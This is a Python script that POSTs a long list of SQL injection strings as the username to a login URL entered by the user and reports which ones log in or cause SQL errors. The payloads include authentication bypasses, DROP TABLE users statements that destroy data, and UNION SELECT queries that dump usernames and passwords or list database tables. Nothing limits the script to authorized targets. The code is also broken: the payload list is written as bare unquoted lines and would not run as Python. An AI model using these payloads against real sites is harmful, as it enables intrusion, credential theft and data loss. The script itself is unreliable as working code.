import subprocess
import requests

def test_payloads(login_url, payloads):
    for payload in payloads:
        username = payload
        password = ""

        # Send the HTTP request with the payload
        data = {
            'username': username,
            'password': password
        }

        try:
            response = requests.post(login_url, data=data)
        except requests.exceptions.RequestException as e:
            print(f"Error occurred: {e}")
            return

        # Check the response for potential SQL injection vulnerabilities
        if "successful login" in response.text:
            print(f"Payload: {payload} - Successful login!")
        elif "SQL error" in response.text:
            print(f"Payload: {payload} - Possible SQL injection vulnerability!")
        else:
            print(f"Payload: {payload} - No vulnerability detected.")

def main():
    login_url = input("Enter the login page URL: ")

    payloads = [
        ' OR '1'='1' --
        ' OR '1'='1' #
        ' OR '1'='1'/*
        ' OR '1'='1'--
        ' OR '1'='1'#
        ' OR '1'='1'/*
        ' OR 1=1 -- -
        ' OR 1=1 #
        ' OR 1=1 /*
        ' OR 'a'='a' --
        ' OR 'a'='a' #
        ' OR 'a'='a'/*
        " OR "1"="1" --
        " OR "1"="1" #
        " OR "1"="1"/*
        " OR 1=1 -- -
        " OR 1=1 #
        " OR 1=1 /*
        " OR "a"="a" --
        " OR "a"="a" #
        " OR "a"="a"/*
        ') OR '1'='1' --
        ') OR '1'='1' #
        ') OR '1'='1'/*
        ') OR 1=1 -- -
        ') OR 1=1 #
        ') OR 1=1 /*
        ') OR 'a'='a' --
        ') OR 'a'='a' #
        ') OR 'a'='a'/*
        " OR "1"="1") --
        " OR "1"="1") #
        " OR "1"="1")/*
        " OR 1=1") ---
        " OR 1=1") #
        " OR "a"="a") --
        " OR "a"="a") #
        " OR "a"="a")/*
        ') OR ('1'='1' --
        ') OR ('1'='1' #
        ') OR ('1'='1'/*
        ') OR 1=1 -- -
        ') OR 1=1 #
        ') OR 1=1 /*
        ') OR 'a'='a' --
        ') OR 'a'='a' #
        ') OR 'a'='a'/*
        " OR "1"="1")) --
        " OR "1"="1")) #
        " OR "1"="1"))/*
        " OR 1=1")) -- -
        " OR 1=1")) #
        " OR "a"="a")) --
        " OR "a"="a")) #
        " OR "a"="a"))/*
        ' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND '1'='1 --
        ' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND '1'='1' #
        ' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND '1'='1'/*
        " OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND "1"="1 --
        " OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND "1"="1" #
        " OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%a%') AND "1"="1"/*
        ' OR 1=1; DROP TABLE users; --
        ' OR 1=1; DROP TABLE users; #
        ' OR 1=1; DROP TABLE users;/*
        " OR 1=1; DROP TABLE users; --
        " OR 1=1; DROP TABLE users; #
        " OR 1=1; DROP TABLE users;/*
        ' OR 'a'='a'; DROP TABLE users; --
        ' OR 'a'='a'; DROP TABLE users; #
        ' OR 'a'='a'; DROP TABLE users;/*
        " OR 'a'='a'; DROP TABLE users; --
        " OR 'a'='a'; DROP TABLE users; #
        " OR 'a'='a'; DROP TABLE users;/*
        ' UNION SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(username,':',password) FROM users --
        ' UNION SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(username,':',password) FROM users #
        ' UNION SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(username,':',password) FROM users/*
        " UNION SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(username,':',password) FROM users --
        " UNION SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(username,':',password) FROM users #
        " UNION SELECT NULL, NULL, NULL, NULL, NULL, CONCAT(username,':',password) FROM users/*
        ' UNION SELECT NULL, NULL, NULL, NULL, NULL, table_name FROM information_schema.tables --
        ' UNION SELECT NULL, NULL, NULL, NULL, NULL, table_name FROM information_schema.tables #  
    ]

    test_payloads(login_url, payloads)

if __name__ == "__main__":
    main()
